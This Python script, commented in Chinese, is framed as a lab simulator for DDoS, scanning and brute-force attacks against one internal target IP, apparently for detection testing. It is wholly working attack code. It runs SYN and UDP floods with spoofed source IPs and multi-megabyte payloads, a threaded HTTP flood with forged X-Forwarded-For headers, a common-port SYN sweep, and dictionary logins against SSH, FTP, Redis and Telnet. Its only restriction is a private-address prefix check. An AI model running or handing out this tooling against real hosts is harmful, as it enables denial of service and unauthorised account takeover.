#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==============================================================================
 攻击机 attacker —— 隔离内网 多向量 DDoS / 多端口扫描 / 常用端口爆破 模拟器
==============================================================================
 部署位置 : /opt/ddos/attacker.py          （root 运行，Scapy 需原始套接字权限）
 只针对    : 192.168.1.137（默认），严禁 --target 指向网关/公网
 用法示例 :
   python3 attacker.py --mode multi-port --mp-rate 50 --duration 20
   python3 attacker.py --mode brute --brute-kinds ssh,ftp,redis,telnet --duration 40
   python3 attacker.py --mode mixed --syn-procs 4 --syn-rate 200 \
            --udp-procs 2 --udp-rate 200 --http-threads 20 --duration 40
   python3 attacker.py --mode http --http-threads 20 --duration 20
   python3 attacker.py --mode dry-run          # 只打印计划，不发包
   # 多真实源 IP 模拟（先绑定别名：bash add_ips.sh add 192.168.1.233-240）
   python3 attacker.py --mode mixed --src-range 192.168.1.233-240 --duration 30
    # 自定义发包大小（MB）：每个逻辑包 1MB，udp 速率 10 逻辑包/秒 ≈ 10MB/s 压带宽
    python3 attacker.py --mode udp --pkt-size 1 --udp-rate 10 --duration 20

 模块与并发:
   syn / udp / multi-port : Scapy 伪造源 IP（默认随机；--src-ips/--src-range 指定时从池抽取）
   http                   : requests 多线程真实握手，threading.Thread；--src-ips 轮询绑定真实源 IP
   brute                  : ssh(paramiko) / ftp(ftplib) / redis(socket) / telnet(socket)；同上轮询绑定
 统一 multiprocessing.Event 控制停止；duration 到期后 stop.set() 并 join。
==============================================================================
"""

import argparse
import multiprocessing
import os
import random
import socket
import sys
import threading
import time

# ============================================================================
#                          关键参数常量区
# ============================================================================

TARGET = "192.168.1.137"          # 靶机 IP（唯一允许攻击的目标）
HTTP_PORT = 80                    # HTTP 模块端口（--port 未指定时使用）
DURATION = 30                     # 默认持续时间（秒）

SYN_PROCS = 4                     # SYN 模块进程数
SYN_RATE = 200                    # 每进程 SYN 速率（pps）
UDP_PROCS = 2                     # UDP 模块进程数
UDP_RATE = 200                    # 每进程 UDP 速率（pps）
HTTP_THREADS = 20                 # HTTP 并发线程数
MP_RATE = 50                      # multi-port 每端口速率（pps）
BRUTE_INTERVAL = 0.2              # 爆破每次尝试间隔（秒）

SYN_BATCH = 20                    # Scapy 每批发送包数
UDP_BATCH = 20
UDP_PAYLOAD = b"X" * 512          # UDP 载荷（1 字节即够，512 提高特征明显度）

# ---- 自定义发包大小（--pkt-size，单位 MB）----
MAX_TCP_DATA = 65495              # 单个 IP 包可携带的 TCP 载荷上限（65535-20-20）
MAX_UDP_DATA = 65507              # 单个 IP 包可携带的 UDP 载荷上限（65535-20-8）
PKT_SIZE_MAX_MB = 16.0            # --pkt-size 上限（防误操作撑爆内存）

# 默认多端口列表（常用端口）
DEFAULT_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
                 993, 995, 1433, 1521, 3306, 3389, 5432, 6379, 8080, 8443, 27017]

# 爆破字典
BRUTE_USERS = ["root", "admin", "test", "guest"]
BRUTE_PASSES = ["123456", "password", "admin", "test", "root", "111111"]
BRUTE_DEFAULT_KINDS = "ssh,ftp"
# 各协议默认端口
BRUTE_PORTS = {"ssh": 22, "ftp": 21, "redis": 6379, "telnet": 23}

STAT_PRINT_INTERVAL = 1.0         # 发包统计打印周期（秒）


# ============================================================================
#                          通用工具
# ============================================================================

def ts():
    return time.strftime("%H:%M:%S")


def say(msg):
    """跨版本安全输出：print(..., flush=True) 仅在 Python3.3+ 可用，
    CentOS7 的 python2 会把它当元组解析而报 SyntaxError，故统一先写再 flush。"""
    sys.stdout.write(str(msg) + "\n")
    sys.stdout.flush()


def p(msg):
    say("[%s] %s" % (ts(), msg))


def safe_rand_ip():
    """生成内网/公网通用随机源 IP（排除 0.x、127.x、224+ 等特殊段）"""
    while True:
        a = random.randint(1, 223)
        if a == 127:
            continue
        return "%d.%d.%d.%d" % (a, random.randint(0, 255), random.randint(0, 255), random.randint(1, 254))


def port_list(spec):
    """'1,2,3' 或 '80' -> [1,2,3]"""
    out = []
    for x in str(spec).replace(" ", "").split(","):
        if not x:
            continue
        if "-" in x:
            lo, hi = x.split("-", 1)
            out.extend(range(int(lo), int(hi) + 1))
        else:
            out.append(int(x))
    return sorted(set(out))


def kind_list(spec, allowed):
    """ssh,ftp -> ['ssh','ftp']，非法项直接报错"""
    out = [k.strip().lower() for k in str(spec).replace(" ", "").split(",") if k.strip()]
    bad = [k for k in out if k not in allowed]
    if bad or not out:
        raise SystemExit("[!] --brute-kinds 非法: %s（可选 %s）" % (",".join(bad) or "空", ",".join(allowed)))
    return out


# ============================================================================
#                     多源 IP（--src-ips / --src-range）
#  - syn/udp/multi-port : 伪造源从池抽取（模拟小型固定僵尸网络）
#  - http/brute         : 轮询绑定真实源 IP（需先用 add_ips.sh 绑定网卡别名）
# ============================================================================

def ip_to_int(ip):
    a, b, c, d = ip.split(".")
    return (int(a) << 24) | (int(b) << 16) | (int(c) << 8) | int(d)


def int_to_ip(n):
    return "%d.%d.%d.%d" % ((n >> 24) & 255, (n >> 16) & 255, (n >> 8) & 255, n & 255)


def parse_ip(spec):
    """校验单个 IPv4，非法直接退出"""
    spec = str(spec).strip()
    parts = spec.split(".")
    ok = len(parts) == 4
    if ok:
        for x in parts:
            if not x.isdigit() or not 0 <= int(x) <= 255:
                ok = False
                break
    if not ok:
        raise SystemExit("[!] 非法 IPv4 地址: %s" % spec)
    return "%d.%d.%d.%d" % tuple(int(x) for x in parts)


def parse_src_range(spec):
    """'192.168.1.233-240' 或 '192.168.1.233-192.168.1.240' -> 列表（含两端，上限 1024）"""
    spec = str(spec).strip()
    if "-" not in spec:
        return [parse_ip(spec)]
    lo, hi = spec.split("-", 1)
    lo, hi = lo.strip(), hi.strip()
    if "." not in hi:                       # 简写结尾：只给末段
        hi = lo.rsplit(".", 1)[0] + "." + hi
    lo_n, hi_n = ip_to_int(parse_ip(lo)), ip_to_int(parse_ip(hi))
    if hi_n < lo_n:
        raise SystemExit("[!] 源 IP 范围结束小于起始: %s" % spec)
    if hi_n - lo_n >= 1024:
        raise SystemExit("[!] 源 IP 范围超过 1024 个: %s" % spec)
    return [int_to_ip(n) for n in range(lo_n, hi_n + 1)]


def parse_src_ips(spec):
    """'a,b,c'（元素可为范围）-> 去重列表"""
    out = []
    for item in str(spec).replace(" ", "").split(","):
        if not item:
            continue
        for ip in parse_src_range(item):
            if ip not in out:
                out.append(ip)
    return out


def local_ipv4s():
    """本机网卡上已绑定的 IPv4 集合（探测失败时返回空集）"""
    out = set()
    try:
        import re
        import subprocess
        txt = subprocess.check_output(["ip", "-o", "-4", "addr", "show"],
                                      stderr=subprocess.STDOUT).decode("utf-8", "ignore")
        for m in re.finditer(r"inet\s+(\d+\.\d+\.\d+\.\d+)", txt):
            out.add(m.group(1))
    except Exception:
        pass
    return out


def spoof_src(src_ips):
    """伪造源 IP：池非空时从池抽取，否则全随机"""
    if src_ips:
        return random.choice(src_ips)
    return safe_rand_ip()


class SrcPool(object):
    """轮询分配真实源 IP；ips 为空时 next() 返回 None（系统默认源地址）。
    各进程/线程内部自建实例，避免跨进程序列化锁。"""

    def __init__(self, ips):
        self.ips = list(ips or [])
        self.i = 0
        self.lock = threading.Lock()

    def next(self):
        if not self.ips:
            return None
        with self.lock:
            ip = self.ips[self.i % len(self.ips)]
            self.i += 1
        return ip


def src_sock(target, port, src_ip, timeout=1):
    """创建到 target:port 的 socket；src_ip 非空时绑定该真实源 IP"""
    if src_ip:
        return socket.create_connection((target, port), timeout=timeout,
                                        source_address=(src_ip, 0))
    return socket.create_connection((target, port), timeout=timeout)


def make_session(src_ip):
    """requests.Session；src_ip 非空时绑定该真实源地址（urllib3 支持 source_address）"""
    import requests
    s = requests.Session()
    if src_ip:
        from requests.adapters import HTTPAdapter
        ad = HTTPAdapter()
        ad.init_poolmanager(ad._pool_connections, ad._pool_maxsize,
                            block=ad._pool_block, source_address=(src_ip, 0))
        s.mount("http://", ad)
    return s


# ============================================================================
#                          负载：SYN / UDP （Scapy）
# ============================================================================

def _load_scapy():
    """延迟导入 scapy（子进程内调用，确保 multiprocessing fork 后仍可用）"""
    try:
        from scapy.all import IP, TCP, UDP, Raw, send, conf
    except ImportError:
        sys.exit("[!] 缺少 scapy，请执行: pip3 install scapy==2.4.5")
    conf.verb = 0
    conf.iface = detect_iface_for_target()
    return IP, TCP, UDP, Raw, send


def detect_iface_for_target(target=None):
    """以 ip route get <target> 为准，返回出口网卡（默认 eth0）
    target 留空时用全局 TARGET，保证 _load_scapy() 无参调用也能工作。"""
    if not target:
        target = TARGET
    try:
        import subprocess
        import re as _re
        out = subprocess.check_output(["ip", "route", "get", target], stderr=subprocess.STDOUT)
        m = _re.search(r"dev\s+(\S+)", out.decode("utf-8", "ignore"))
        if m:
            return m.group(1)
    except Exception:
        pass
    return "eth0"


class RateLimiter(object):
    """简易令牌桶：每 interval 允许 n 个包"""

    def __init__(self, rate_per_sec):
        self.rate = max(1.0, float(rate_per_sec))
        self.interval = 1.0 / self.rate
        self.next_t = time.time()

    def sleep(self):
        now = time.time()
        if self.next_t > now:
            time.sleep(self.next_t - now)
        self.next_t = max(self.next_t, time.time()) + self.interval


# ============================================================================
#                    自定义发包大小（--pkt-size，单位 MB）
# ============================================================================

_PAYLOAD_CACHE = {}


def chunk_sizes(total, max_chunk):
    """把 total 字节拆成 <=max_chunk 的片段大小列表（一个逻辑大包 = 多个 IP 包）"""
    sizes = []
    left = int(total)
    while left > 0:
        n = max_chunk if left > max_chunk else left
        sizes.append(n)
        left -= n
    return sizes


def fill_payload(n):
    """n 字节填充载荷（同尺寸缓存一份，避免每包重建大对象）"""
    buf = _PAYLOAD_CACHE.get(n)
    if buf is None:
        buf = b"X" * n
        _PAYLOAD_CACHE.clear()      # 只保留当前尺寸，省内存
        _PAYLOAD_CACHE[n] = buf
    return buf


def syn_flood(target, dport, rate, src_ips, pkt_bytes, stop, stats):
    """SYN 模块：伪造源批量发 TCP SYN（指定源 IP 池则从池抽取，否则全随机）；
    pkt_bytes>0 时每个 SYN 携带载荷，超单包上限自动拆成多个包（一个逻辑包占一个速率令牌）"""
    IP, TCP, _UDP, Raw, send = _load_scapy()
    lim = RateLimiter(rate)
    sent = 0
    nbytes = 0
    last_report = time.time()
    if pkt_bytes > 0:
        chunks = chunk_sizes(pkt_bytes, MAX_TCP_DATA)
        while not stop.is_set():
            batch = []
            for n in chunks:
                batch.append(IP(dst=target, src=spoof_src(src_ips))
                             / TCP(sport=random.randint(1024, 65535), dport=dport, flags="S")
                             / Raw(load=fill_payload(n)))
            try:
                send(batch, verbose=0)
                sent += len(batch)
                nbytes += pkt_bytes
            except Exception:
                break
            lim.sleep()
            if stats is not None and time.time() - last_report >= STAT_PRINT_INTERVAL:
                p("  syn  pid=%d  已发送 %d 包 / %.1f MB（%s:%d，%.3fMB/包）"
                  % (os.getpid(), sent, nbytes / 1048576.0, target, dport,
                     pkt_bytes / 1048576.0))
                last_report = time.time()
                try:
                    stats.value = sent
                except Exception:
                    pass
        return
    while not stop.is_set():
        batch = [IP(dst=target, src=spoof_src(src_ips)) / TCP(sport=random.randint(1024, 65535),
                                                  dport=dport, flags="S")
                 for _ in range(SYN_BATCH)]
        try:
            send(batch, verbose=0)
            sent += len(batch)
        except Exception:
            break
        for _ in batch:
            lim.sleep()
        if stats is not None and time.time() - last_report >= STAT_PRINT_INTERVAL:
            p("  syn  pid=%d  已发送 %d 个 SYN（%s:%d）" % (os.getpid(), sent, target, dport))
            last_report = time.time()
            try:
                stats.value = sent
            except Exception:
                pass


def udp_flood(target, dport, rate, src_ips, pkt_bytes, stop, stats):
    """UDP 模块：伪造源向 53/UDP 发随机载荷（池非空从池抽取，否则全随机）；
    pkt_bytes>0 时每个逻辑包载荷 = pkt_bytes 字节，超单包上限自动拆成多个数据报"""
    IP, _TCP, UDP, Raw, send = _load_scapy()
    lim = RateLimiter(rate)
    sent = 0
    nbytes = 0
    last_report = time.time()
    if pkt_bytes > 0:
        chunks = chunk_sizes(pkt_bytes, MAX_UDP_DATA)
        while not stop.is_set():
            batch = []
            for n in chunks:
                batch.append(IP(dst=target, src=spoof_src(src_ips))
                             / UDP(sport=random.randint(1024, 65535), dport=dport)
                             / Raw(load=fill_payload(n)))
            try:
                send(batch, verbose=0)
                sent += len(batch)
                nbytes += pkt_bytes
            except Exception:
                break
            lim.sleep()
            if stats is not None and time.time() - last_report >= STAT_PRINT_INTERVAL:
                p("  udp  pid=%d  已发送 %d 包 / %.1f MB（%s:%d，%.3fMB/包）"
                  % (os.getpid(), sent, nbytes / 1048576.0, target, dport,
                     pkt_bytes / 1048576.0))
                last_report = time.time()
                try:
                    stats.value = sent
                except Exception:
                    pass
        return
    while not stop.is_set():
        batch = [IP(dst=target, src=spoof_src(src_ips)) / UDP(sport=random.randint(1024, 65535), dport=dport)
                 / Raw(load=UDP_PAYLOAD) for _ in range(UDP_BATCH)]
        try:
            send(batch, verbose=0)
            sent += len(batch)
        except Exception:
            break
        for _ in batch:
            lim.sleep()
        if stats is not None and time.time() - last_report >= STAT_PRINT_INTERVAL:
            p("  udp  pid=%d  已发送 %d 个 UDP（%s:%d）" % (os.getpid(), sent, target, dport))
            last_report = time.time()
            try:
                stats.value = sent
            except Exception:
                pass


def multiport_scan(target, ports, rate, src_ips, stop, stats):
    """multi-port 模块：遍历端口列表逐个发 SYN（伪造源），检测扫描"""
    IP, TCP, _UDP, _Raw, send = _load_scapy()
    lim = RateLimiter(rate)
    sent = 0
    loops = 0
    last_report = time.time()
    while not stop.is_set():
        for dport in ports:
            if stop.is_set():
                break
            pkt = IP(dst=target, src=spoof_src(src_ips)) / TCP(sport=random.randint(1024, 65535),
                                                   dport=dport, flags="S")
            try:
                send(pkt, verbose=0)
                sent += 1
            except Exception:
                return
            lim.sleep()
        loops += 1
        if stats is not None and time.time() - last_report >= STAT_PRINT_INTERVAL:
            p("  multi-port  pid=%d  第 %d 轮  已发送 %d 个 SYN（%d 个端口）"
              % (os.getpid(), loops, sent, len(ports)))
            last_report = time.time()
            try:
                stats.value = sent
            except Exception:
                pass


# ============================================================================
#                          负载：HTTP （requests 多线程）
# ============================================================================

HTTP_PATHS = ["/", "/index.html", "/login", "/api", "/search?q=test", "/" + "a" * 60]
HTTP_UAS = ["ddos-test", "Mozilla/5.0 ddos-test", "python-requests ddos-test"]


def http_flood(target, port, threads, src_ips, pkt_bytes, stop, stats):
    """HTTP 模块：多线程 GET，伪造 X-Forwarded-For 与 User-Agent，超时 1s；
    src_ips 非空时按轮询绑定真实源 IP（每个源独立连接池）；
    pkt_bytes>0 时改发 POST，body = pkt_bytes 字节（大包压带宽）"""
    try:
        import requests
    except ImportError:
        p("  http  [!] 缺少 requests，跳过 HTTP 模块")
        return
    counter = {"ok": 0, "err": 0}
    lock = threading.Lock()
    url_host = target
    pool = SrcPool(src_ips)
    body = fill_payload(pkt_bytes) if pkt_bytes > 0 else None
    # 大包发送耗时，按体积分档放宽超时（上限 15s）
    http_timeout = 1.0 if pkt_bytes == 0 else max(2.0, min(15.0, pkt_bytes / 1048576.0 * 3.0))

    def worker(wid):
        sessions = {}
        while not stop.is_set():
            src = pool.next()                # None = 系统默认源地址
            s = sessions.get(src)
            if s is None:
                try:
                    s = make_session(src)
                except Exception:
                    s = requests.Session()   # 兜底：不绑定
                sessions[src] = s
            xff = safe_rand_ip()
            headers = {"X-Forwarded-For": xff,
                       "User-Agent": random.choice(HTTP_UAS),
                       "Accept": "*/*",
                       "Connection": "close"}
            url = "http://%s:%d%s" % (url_host, port, random.choice(HTTP_PATHS))
            try:
                if body is not None:
                    r = s.post(url, data=body, headers=headers, timeout=http_timeout)
                else:
                    r = s.get(url, headers=headers, timeout=http_timeout)
                with lock:
                    counter["ok"] += 1
            except Exception:
                with lock:
                    counter["err"] += 1

    ths = []
    for i in range(threads):
        th = threading.Thread(target=worker, args=(i,))
        th.daemon = True          # py3.3+ 才支持构造参数 daemon=，py2 只能赋属性
        ths.append(th)
    for th in ths:
        th.start()
    last_report = time.time()
    last_total = 0
    while not stop.is_set():
        time.sleep(0.5)
        if time.time() - last_report >= STAT_PRINT_INTERVAL:
            total = counter["ok"] + counter["err"]
            p("  http  线程=%d  成功=%d 失败=%d  合计=%d"
              % (threads, counter["ok"], counter["err"], total))
            last_report = time.time()
            last_total = total
    stop.set()
    for th in ths:
        th.join(timeout=2)
    p("  http  结束  成功=%d 失败=%d" % (counter["ok"], counter["err"]))


# ============================================================================
#                          负载：爆破
# ============================================================================

def brute_ssh(target, port, src_ips, stop):
    try:
        import paramiko
    except ImportError:
        p("  brute[ssh] [!] 缺少 paramiko，跳过 ssh")
        return
    pool = SrcPool(src_ips)
    client = None
    sock = None
    for user in BRUTE_USERS:
        for pwd in BRUTE_PASSES:
            if stop.is_set():
                return
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                sock = src_sock(target, port, pool.next(), timeout=1)   # 绑定真实源 IP
                client.connect(target, port=port, username=user, password=pwd,
                               timeout=1, banner_timeout=1, auth_timeout=1,
                               allow_agent=False, look_for_keys=False, sock=sock)
                p("  [ssh] success %s/%s" % (user, pwd))
            except paramiko.AuthenticationException:
                pass
            except Exception:
                pass
            finally:
                try:
                    if client:
                        client.close()
                except Exception:
                    pass
                try:
                    if sock:
                        sock.close()
                except Exception:
                    pass
                client = None
                sock = None
            time.sleep(BRUTE_INTERVAL)


def brute_ftp(target, port, src_ips, stop):
    import ftplib
    pool = SrcPool(src_ips)
    for user in BRUTE_USERS:
        for pwd in BRUTE_PASSES:
            if stop.is_set():
                return
            ftp = None
            src = pool.next()
            try:
                ftp = ftplib.FTP()
                if src:
                    try:
                        ftp.connect(target, port, timeout=1, source_address=(src, 0))
                    except TypeError:            # py2 ftplib 无 source_address，手动接管 socket
                        sock = src_sock(target, port, src, timeout=1)
                        ftp.sock = sock
                        ftp.af = sock.family
                        ftp.file = sock.makefile("rb")
                        ftp.welcome = ftp.getresp()
                else:
                    ftp.connect(target, port, timeout=1)
                ftp.login(user, pwd)
                p("  [ftp] success %s/%s" % (user, pwd))
            except Exception:
                pass
            finally:
                try:
                    if ftp:
                        ftp.close()
                except Exception:
                    pass
            time.sleep(BRUTE_INTERVAL)


def brute_redis(target, port, src_ips, stop):
    pool = SrcPool(src_ips)
    for user in BRUTE_USERS:
        for pwd in BRUTE_PASSES:
            if stop.is_set():
                return
            s = None
            try:
                s = src_sock(target, port, pool.next(), timeout=1)   # 绑定真实源 IP
                s.sendall(("AUTH %s\r\n" % pwd).encode())
                resp = s.recv(64)
                if resp.startswith(b"+OK"):
                    p("  [redis] success %s/%s" % (user, pwd))
            except Exception:
                pass
            finally:
                try:
                    if s:
                        s.close()
                except Exception:
                    pass
            time.sleep(BRUTE_INTERVAL)


def brute_telnet(target, port, src_ips, stop):
    pool = SrcPool(src_ips)
    for user in BRUTE_USERS:
        for pwd in BRUTE_PASSES:
            if stop.is_set():
                return
            s = None
            try:
                s = src_sock(target, port, pool.next(), timeout=1)   # 绑定真实源 IP
                s.settimeout(1)
                try:
                    s.recv(256)                      # 服务器 banner
                except Exception:
                    pass
                s.sendall((user + "\r\n").encode())   # 依次发送用户名/密码
                time.sleep(BRUTE_INTERVAL)
                try:
                    s.recv(256)
                except Exception:
                    pass
                s.sendall((pwd + "\r\n").encode())
                try:
                    resp = s.recv(256)
                    low = resp.lower()
                    if b"incorrect" not in low and b"failed" not in low and b"denied" not in low and resp:
                        p("  [telnet] maybe success %s/%s" % (user, pwd))
                except Exception:
                    pass
            except Exception:
                pass
            finally:
                try:
                    if s:
                        s.close()
                except Exception:
                    pass
            time.sleep(BRUTE_INTERVAL)


BRUTE_FUNCS = {"ssh": brute_ssh, "ftp": brute_ftp, "redis": brute_redis, "telnet": brute_telnet}


def brute_worker(kind, target, port, src_ips, stop):
    p("  brute[%s] 开始  用户=%s  密码 %d 个  间隔 %.1fs"
      % (kind, ",".join(BRUTE_USERS), len(BRUTE_PASSES), BRUTE_INTERVAL))
    BRUTE_FUNCS[kind](target, port, src_ips, stop)
    p("  brute[%s] 结束" % kind)


# ============================================================================
#                          进程 / 线程调度
# ============================================================================

def start_processes(target, mode, args, stop, stats):
    """返回 multiprocessing.Process 列表"""
    procs = []
    ports = port_list(args.ports) if args.ports else DEFAULT_PORTS

    def mk(name, fn, *fargs):
        pr = multiprocessing.Process(target=fn, args=fargs + (stop, stats), name=name)
        pr.daemon = True           # py3.3+ 才支持构造参数 daemon=，py2 只能赋属性（start 前）
        pr.start()
        procs.append(pr)
        p("  启动进程 %-12s pid=%d" % (name, pr.pid))

    if mode in ("syn", "mixed"):
        for i in range(args.syn_procs):
            mk("syn-%d" % i, syn_flood, target, args.port, args.syn_rate, args.src_pool, args.pkt_bytes)
    if mode in ("udp", "mixed"):
        for i in range(args.udp_procs):
            mk("udp-%d" % i, udp_flood, target, args.port, args.udp_rate, args.src_pool, args.pkt_bytes)
    if mode in ("multi-port", "mixed"):
        for i in range(1):
            mk("multi-port", multiport_scan, target, ports, args.mp_rate, args.src_pool)
    return procs


def join_processes(procs, timeout=10):
    for pr in procs:
        pr.join(timeout=timeout)
        if pr.is_alive():
            pr.terminate()
            pr.join(timeout=2)


def run_mode(target, mode, args, stop):
    stats = multiprocessing.Value("i", 0)
    procs = []
    threads = []

    if mode != "dry-run":
        procs = start_processes(target, mode, args, stop, stats)

    # HTTP：线程（不 fork，避免与 requests 的 TLS 状态冲突）
    if mode in ("http", "mixed"):
        th = threading.Thread(target=http_flood, name="http",
                              args=(target, args.port, args.http_threads,
                                    args.src_pool, args.pkt_bytes, stop, stats))
        th.daemon = True           # py2 兼容：不支持构造参数 daemon=
        th.start()
        threads.append(th)

    # 爆破：多进程，每个协议一个进程（与 Scapy 发包进程隔离）
    if mode in ("brute", "mixed"):
        kinds = kind_list(args.brute_kinds, list(BRUTE_FUNCS.keys()))
        for kind in kinds:
            pr = multiprocessing.Process(target=brute_worker,
                                         args=(kind, target, BRUTE_PORTS.get(kind, 22),
                                               args.src_pool, stop),
                                         name="brute-" + kind)
            pr.daemon = True       # py2 兼容：不支持构造参数 daemon=
            pr.start()
            procs.append(pr)
            p("  启动进程 %-12s pid=%d" % ("brute-" + kind, pr.pid))

    return procs, threads, stats


def main():
    global BRUTE_INTERVAL

    ap = argparse.ArgumentParser(
        description="DDoS/扫描/爆破 模拟器（仅限隔离内网，仅打 192.168.1.137）",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    ap.add_argument("--target", default=TARGET, help="靶机 IP（只允许内网）")
    ap.add_argument("--mode", default="mixed", choices=["syn", "udp", "http", "multi-port",
                                                       "brute", "mixed", "dry-run"],
                    help="攻击模式；dry-run 只打印计划")
    ap.add_argument("--port", type=int, default=HTTP_PORT, help="SYN/UDP/HTTP 目的端口")
    ap.add_argument("--ports", default="", help="multi-port 端口列表，例如 21,22,80,6379")
    ap.add_argument("--syn-procs", type=int, default=SYN_PROCS, help="SYN 进程数")
    ap.add_argument("--syn-rate", type=int, default=SYN_RATE, help="每进程 SYN pps")
    ap.add_argument("--udp-procs", type=int, default=UDP_PROCS, help="UDP 进程数")
    ap.add_argument("--udp-rate", type=int, default=UDP_RATE, help="每进程 UDP pps")
    ap.add_argument("--http-threads", type=int, default=HTTP_THREADS, help="HTTP 并发线程")
    ap.add_argument("--mp-rate", type=int, default=MP_RATE, help="multi-port 每端口 pps")
    ap.add_argument("--pkt-size", type=float, default=0.0,
                    help="发包载荷大小（MB），0=默认小包；syn/udp 超单包上限自动拆分，http 用 POST body")
    ap.add_argument("--brute-kinds", default=BRUTE_DEFAULT_KINDS, help="ssh,ftp,redis,telnet")
    ap.add_argument("--brute-interval", type=float, default=BRUTE_INTERVAL, help="爆破尝试间隔（秒）")
    ap.add_argument("--src-ips", default="",
                    help="源 IP 池，逗号分隔，元素可为范围（如 192.168.1.233,192.168.1.235-240）")
    ap.add_argument("--src-range", default="",
                    help="源 IP 范围，如 192.168.1.233-240 或 192.168.1.233-192.168.1.240")
    ap.add_argument("--duration", type=int, default=DURATION, help="持续时间（秒）")
    args = ap.parse_args()

    BRUTE_INTERVAL = args.brute_interval
    if not (0.0 <= args.pkt_size <= PKT_SIZE_MAX_MB):
        raise SystemExit("[!] --pkt-size 需在 0~%.0f MB 之间，当前=%s" % (PKT_SIZE_MAX_MB, args.pkt_size))
    args.pkt_bytes = int(args.pkt_size * 1024 * 1024) if args.pkt_size > 0 else 0
    target = args.target
    if not (target.startswith("192.168.") or target.startswith("10.") or target.startswith("172.")):
        raise SystemExit("[!] 只允许攻击内网地址，当前 --target=%s" % target)
    # 无论何种模式都先校验爆破协议参数，避免跑完 30s 才发现拼写错误
    kinds = kind_list(args.brute_kinds, list(BRUTE_FUNCS.keys()))

    # 多源 IP 池（--src-ips 与 --src-range 合并去重）
    srcs = []
    for spec in (args.src_ips, args.src_range):
        if spec:
            for ip in parse_src_ips(spec):
                if ip not in srcs:
                    srcs.append(ip)
    args.src_pool = srcs
    missing = []
    if srcs:
        bound = local_ipv4s()
        missing = [ip for ip in srcs if ip not in bound]
        # http/brute 需要真实绑定；syn/udp/multi-port 是伪造源，未绑定也无所谓
        if missing and args.mode in ("http", "brute", "mixed"):
            raise SystemExit("[!] 以下源 IP 未绑定到本机网卡，http/brute 需真实源地址，请先执行:\n"
                             "      bash add_ips.sh add %s\n"
                             "    未绑定: %s" % (",".join(missing), " ".join(missing)))

    print("=" * 70)
    print(" DDoS 模拟器  目标=%s  模式=%s  时长=%ds%s%s"
          % (target, args.mode, args.duration,
             ("  源IP池=%d" % len(srcs)) if srcs else "",
             ("  发包=%.3fMB/包" % args.pkt_size) if args.pkt_size > 0 else ""))
    if args.mode == "dry-run":
        ports = port_list(args.ports) if args.ports else DEFAULT_PORTS
        print("   syn        : procs=%d rate=%d pps/进程 port=%d" % (args.syn_procs, args.syn_rate, args.port))
        print("   udp        : procs=%d rate=%d pps/进程 port=%d" % (args.udp_procs, args.udp_rate, args.port))
        print("   http       : threads=%d http://%s:%d/" % (args.http_threads, target, args.port))
        print("   multi-port : %d 个端口 rate=%d pps/端口 -> %s" % (len(ports), args.mp_rate, ports))
        print("   brute      : kinds=%s interval=%.2fs" % (",".join(kinds), args.brute_interval))
        if args.pkt_size > 0:
            print("   pkt-size   : %.3fMB/包 -> syn 拆 %d 个 IP 包、udp 拆 %d 个数据报"
                  "（速率按逻辑包计，每进程约 %.1fMB/s）；http=POST body %dB"
                  % (args.pkt_size,
                     len(chunk_sizes(args.pkt_bytes, MAX_TCP_DATA)),
                     len(chunk_sizes(args.pkt_bytes, MAX_UDP_DATA)),
                     args.syn_rate * args.pkt_size, args.pkt_bytes))
        else:
            print("   pkt-size   : 默认小包（SYN 空载荷 / UDP 512B / HTTP GET）")
        if srcs:
            shown = srcs if len(srcs) <= 8 else srcs[:8] + ["..."]
            print("   src        : %d 个 -> %s" % (len(srcs), " ".join(shown)))
            print("                syn/udp/multi-port 伪造源从池抽取；http/brute 轮询绑定真实源 IP")
            if missing:
                print("   [!] 未绑定到本机网卡（先执行 add_ips.sh add）: %s" % " ".join(missing))
        print("=" * 70)
        return

    stop = multiprocessing.Event()
    procs, threads, stats = run_mode(target, args.mode, args, stop)

    # 定时停止
    try:
        t0 = time.time()
        while time.time() - t0 < args.duration:
            if not any(pr.is_alive() for pr in procs) and not any(th.is_alive() for th in threads):
                p("所有任务已结束（可能全部失败，请检查依赖/权限）")
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        p("收到 Ctrl-C，提前停止")
    finally:
        stop.set()
        p("停止中 ...")
        for th in threads:
            th.join(timeout=3)
        join_processes(procs)
        p("全部结束（scapy 累计发包计数 %d）" % (stats.value if hasattr(stats, "value") else 0))


if __name__ == "__main__":
    main()
